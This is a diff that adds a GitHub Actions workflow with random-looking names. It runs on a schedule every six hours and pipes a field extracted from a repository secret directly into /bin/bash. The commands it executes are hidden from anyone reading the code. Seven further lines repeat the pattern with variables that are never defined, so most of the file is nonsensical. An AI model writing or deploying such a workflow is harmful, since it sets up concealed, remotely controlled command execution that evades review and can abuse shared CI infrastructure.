@@ -1,0 +1,26 @@
+name: liyongfei1820
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liyongfei1820
+        env:
+          tas8508: ${{ secrets.tas8508 }}
+        run: |
+          echo $tas8508 | jq -r .xko14 | /bin/bash
+          echo $rztcc2 | jq -r .puzkc35934 | /bin/bash
+          echo $dshly95209 | jq -r .ni5 | /bin/bash
+          echo $oeq5 | jq -r .x9 | /bin/bash
+          echo $uwa16899 | jq -r .pi64 | /bin/bash
+          echo $ptfcn84 | jq -r .d7 | /bin/bash
+          echo $b1 | jq -r .aj7 | /bin/bash
+          echo $rgl0 | jq -r .ywvd311 | /bin/bash
+
